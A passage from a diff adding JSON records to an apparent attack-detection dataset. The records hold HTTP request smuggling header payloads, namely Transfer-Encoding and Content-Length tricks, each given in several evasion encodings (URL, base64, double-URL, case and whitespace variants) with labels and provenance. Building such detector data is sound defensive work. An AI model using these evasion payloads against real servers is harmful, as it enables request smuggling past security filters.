+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63263010,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00012__obf02",
+    "payload": "Q29udGVudC1MZW5ndGg6IDE1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aceac55e5fbbe7c535582181c5c494437b331e7edeca89c09afdabe32fc3b1b8",
+    "original_id": "raw_hsmug_00012",
+    "original_payload": "Content-Length: 15",
+    "obfuscated_payload": "Q29udGVudC1MZW5ndGg6IDE1",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 63264019,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00012__obf03",
+    "payload": "CONteNt-lenGTh: 15",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aceac55e5fbbe7c535582181c5c494437b331e7edeca89c09afdabe32fc3b1b8",
+    "original_id": "raw_hsmug_00012",
+    "original_payload": "Content-Length: 15",
+    "obfuscated_payload": "CONteNt-lenGTh: 15",
+    "obfuscation_chain": [
+      "header_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63265028,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00012__obf04",
+    "payload": "Content%2DLength: 15",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aceac55e5fbbe7c535582181c5c494437b331e7edeca89c09afdabe32fc3b1b8",
+    "original_id": "raw_hsmug_00012",
+    "original_payload": "Content-Length: 15",
+    "obfuscated_payload": "Content%2DLength: 15",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63266037,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00013__obf01",
+    "payload": "%54ransf%65r-Enco%64ing: xchunked\nTr%61nsfe%72%2DEn%63oding : ch%75nked\nTr%61nsfer-%45n%63oding: c%68%75%6Eked\nTransfer-E%6Ec%6Fding: %78\n%54ransfer-E%6Ec%6Fdi%6Eg:[tab]%63h%75nked\n[space]Transfer-%45%6E%63%6Fding: chun%6Bed\nX: X[\\n]Tr%61nsfer%2DEncoding: chu%6Eked\nTransfe%72-Encoding\n: chun%6Bed",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "30c25a8d820aab726dce97bfb7955b59ac621605ef3ccba91c98634eee3d67f9",
+    "original_id": "raw_hsmug_00013",
+    "original_payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "obfuscated_payload": "%54ransf%65r-Enco%64ing: xchunked\nTr%61nsfe%72%2DEn%63oding : ch%75nked\nTr%61nsfer-%45n%63oding: c%68%75%6Eked\nTransfer-E%6Ec%6Fding: %78\n%54ransfer-E%6Ec%6Fdi%6Eg:[tab]%63h%75nked\n[space]Transfer-%45%6E%63%6Fding: chun%6Bed\nX: X[\\n]Tr%61nsfer%2DEncoding: chu%6Eked\nTransfe%72-Encoding\n: chun%6Bed",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63363013,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00013__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHhjaHVua2VkClRyYW5zZmVyLUVuY29kaW5nIDogY2h1bmtlZApUcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZApUcmFuc2Zlci1FbmNvZGluZzogeApUcmFuc2Zlci1FbmNvZGluZzpbdGFiXWNodW5rZWQKW3NwYWNlXVRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkClg6IFhbXG5dVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQKVHJhbnNmZXItRW5jb2RpbmcKOiBjaHVua2Vk",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "30c25a8d820aab726dce97bfb7955b59ac621605ef3ccba91c98634eee3d67f9",
+    "original_id": "raw_hsmug_00013",
+    "original_payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHhjaHVua2VkClRyYW5zZmVyLUVuY29kaW5nIDogY2h1bmtlZApUcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZApUcmFuc2Zlci1FbmNvZGluZzogeApUcmFuc2Zlci1FbmNvZGluZzpbdGFiXWNodW5rZWQKW3NwYWNlXVRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2VkClg6IFhbXG5dVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQKVHJhbnNmZXItRW5jb2RpbmcKOiBjaHVua2Vk",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 63364022,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00013__obf03",
+    "payload": "Transfer-Encoding :\txchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "30c25a8d820aab726dce97bfb7955b59ac621605ef3ccba91c98634eee3d67f9",
+    "original_id": "raw_hsmug_00013",
+    "original_payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "obfuscated_payload": "Transfer-Encoding :\txchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63365031,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00013__obf04",
+    "payload": "Transfer-Encoding%253A%2509xchunked%250ATransfer-Encoding%2520%253A%2520chunked%250ATransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%253A%2520x%250ATransfer-Encoding%253A%255Btab%255Dchunked%250A%255Bspace%255DTransfer-Encoding%253A%2520chunked%250AX%253A%2520X%255B%255Cn%255DTransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%250A%253A%2520chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "30c25a8d820aab726dce97bfb7955b59ac621605ef3ccba91c98634eee3d67f9",
+    "original_id": "raw_hsmug_00013",
+    "original_payload": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked\nTransfer-Encoding: chunked\nTransfer-Encoding: x\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked",
+    "obfuscated_payload": "Transfer-Encoding%253A%2509xchunked%250ATransfer-Encoding%2520%253A%2520chunked%250ATransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%253A%2520x%250ATransfer-Encoding%253A%255Btab%255Dchunked%250A%255Bspace%255DTransfer-Encoding%253A%2520chunked%250AX%253A%2520X%255B%255Cn%255DTransfer-Encoding%253A%2520chunked%250ATransfer-Encoding%250A%253A%2520chunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 63366040,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00014__obf01",
+    "payload": "Transfer-Encoding:%20xchunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4156f371bf13e71f551ed6f41f86670c057b679bff2ae0fc53539049fcf9b0bf",
+    "original_id": "raw_hsmug_00014",
+    "original_payload": "Transfer-Encoding: xchunked",
+    "obfuscated_payload": "Transfer-Encoding:%20xchunked",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63463016,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00014__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHhjaHVua2Vk",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4156f371bf13e71f551ed6f41f86670c057b679bff2ae0fc53539049fcf9b0bf",
+    "original_id": "raw_hsmug_00014",
+    "original_payload": "Transfer-Encoding: xchunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHhjaHVua2Vk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 63464025,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00014__obf03",
+    "payload": "Transfer-Encoding:\txchunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4156f371bf13e71f551ed6f41f86670c057b679bff2ae0fc53539049fcf9b0bf",
+    "original_id": "raw_hsmug_00014",
+    "original_payload": "Transfer-Encoding: xchunked",
+    "obfuscated_payload": "Transfer-Encoding:\txchunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63465034,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00014__obf04",
+    "payload": "Transfer-Encoding%3A%09xchunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4156f371bf13e71f551ed6f41f86670c057b679bff2ae0fc53539049fcf9b0bf",
+    "original_id": "raw_hsmug_00014",
+    "original_payload": "Transfer-Encoding: xchunked",
+    "obfuscated_payload": "Transfer-Encoding%3A%09xchunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63466043,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00015__obf01",
+    "payload": "Transfer-Encoding%20%3A chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "15ad8cee2e79c118711de2815fc32432d3431849306d7beec16b179a9f89d8d6",
+    "original_id": "raw_hsmug_00015",
+    "original_payload": "Transfer-Encoding : chunked",
+    "obfuscated_payload": "Transfer-Encoding%20%3A chunked",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63563019,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00015__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2RpbmcgOiBjaHVua2Vk",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "15ad8cee2e79c118711de2815fc32432d3431849306d7beec16b179a9f89d8d6",
+    "original_id": "raw_hsmug_00015",
+    "original_payload": "Transfer-Encoding : chunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2RpbmcgOiBjaHVua2Vk",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 63564028,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00015__obf03",
+    "payload": "Transfer-Encoding \\u003a chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "15ad8cee2e79c118711de2815fc32432d3431849306d7beec16b179a9f89d8d6",
+    "original_id": "raw_hsmug_00015",
+    "original_payload": "Transfer-Encoding : chunked",
+    "obfuscated_payload": "Transfer-Encoding \\u003a chunked",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 63565037,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00015__obf04",
+    "payload": "Transfer-Encoding%2520%253A%2520chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "15ad8cee2e79c118711de2815fc32432d3431849306d7beec16b179a9f89d8d6",
+    "original_id": "raw_hsmug_00015",
+    "original_payload": "Transfer-Encoding : chunked",
+    "obfuscated_payload": "Transfer-Encoding%2520%253A%2520chunked",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 63566046,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00016__obf01",
+    "payload": "Transfe%72-Encoding: x",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ab12a135a1b21484be5d7c8f39a786301bc72302676b9d7cc4116ee2676fbfd4",
+    "original_id": "raw_hsmug_00016",
+    "original_payload": "Transfer-Encoding: x",
+    "obfuscated_payload": "Transfe%72-Encoding: x",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63663022,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00016__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHg",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ab12a135a1b21484be5d7c8f39a786301bc72302676b9d7cc4116ee2676fbfd4",
+    "original_id": "raw_hsmug_00016",
+    "original_payload": "Transfer-Encoding: x",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6IHg",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 63664031,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00016__obf03",
+    "payload": "Transfer-Encoding : x",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ab12a135a1b21484be5d7c8f39a786301bc72302676b9d7cc4116ee2676fbfd4",
+    "original_id": "raw_hsmug_00016",
+    "original_payload": "Transfer-Encoding: x",
+    "obfuscated_payload": "Transfer-Encoding : x",
+    "obfuscation_chain": [
+      "hsmug_te_space_before_colon"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63665040,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00016__obf04",
+    "payload": "Transfer-Encoding%253A%2520x",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ab12a135a1b21484be5d7c8f39a786301bc72302676b9d7cc4116ee2676fbfd4",
+    "original_id": "raw_hsmug_00016",
+    "original_payload": "Transfer-Encoding: x",
+    "obfuscated_payload": "Transfer-Encoding%253A%2520x",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 63666049,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00017__obf01",
+    "payload": "Transfer-Encoding%253A%255Btab%255Dchunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "de980ca9c8cedde50b88bcc11a44d0863af289f6ef5bcc8721d0d6d845ab7656",
+    "original_id": "raw_hsmug_00017",
+    "original_payload": "Transfer-Encoding:[tab]chunked",
+    "obfuscated_payload": "Transfer-Encoding%253A%255Btab%255Dchunked",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 63763025,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00017__obf02",
+    "payload": "VHJhbnNmZXItRW5jb2Rpbmc6W3RhYl1jaHVua2Vk",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "de980ca9c8cedde50b88bcc11a44d0863af289f6ef5bcc8721d0d6d845ab7656",
+    "original_id": "raw_hsmug_00017",
+    "original_payload": "Transfer-Encoding:[tab]chunked",
+    "obfuscated_payload": "VHJhbnNmZXItRW5jb2Rpbmc6W3RhYl1jaHVua2Vk",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 63764034,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00017__obf03",
+    "payload": "Transfer-Encoding:\t[tab]chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "de980ca9c8cedde50b88bcc11a44d0863af289f6ef5bcc8721d0d6d845ab7656",
+    "original_id": "raw_hsmug_00017",
+    "original_payload": "Transfer-Encoding:[tab]chunked",
+    "obfuscated_payload": "Transfer-Encoding:\t[tab]chunked",
+    "obfuscation_chain": [
+      "hsmug_te_tab_value"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 63765043,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_hsmug_00017__obf04",
+    "payload": "Trans%66%65%72-E%6Ecod%69ng :[tab]c%68unk%65d",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "de980ca9c8cedde50b88bcc11a44d0863af289f6ef5bcc8721d0d6d845ab7656",
+    "original_id": "raw_hsmug_00017",
+    "original_payload": "Transfer-Encoding:[tab]chunked",
+    "obfuscated_payload": "Trans%66%65%72-E%6Ecod%69ng :[tab]c%68unk%65d",
+    "obfuscation_chain": [
+      "hsmug_te_space_before_colon",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63766052,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00018__obf01",
+    "payload": "%5Bspace%5DTransfer-Encoding%3A chunked",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bea3926d854df4ed194228dafb27469ee4a2e60259d9d118ede1d23826bd7423",
+    "original_id": "raw_hsmug_00018",
+    "original_payload": "[space]Transfer-Encoding: chunked",
+    "obfuscated_payload": "%5Bspace%5DTransfer-Encoding%3A chunked",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 63863028,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00018__obf02",
+    "payload": "W3NwYWNlXVRyYW5zZmVyLUVuY29kaW5nOiBjaHVua2Vk",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
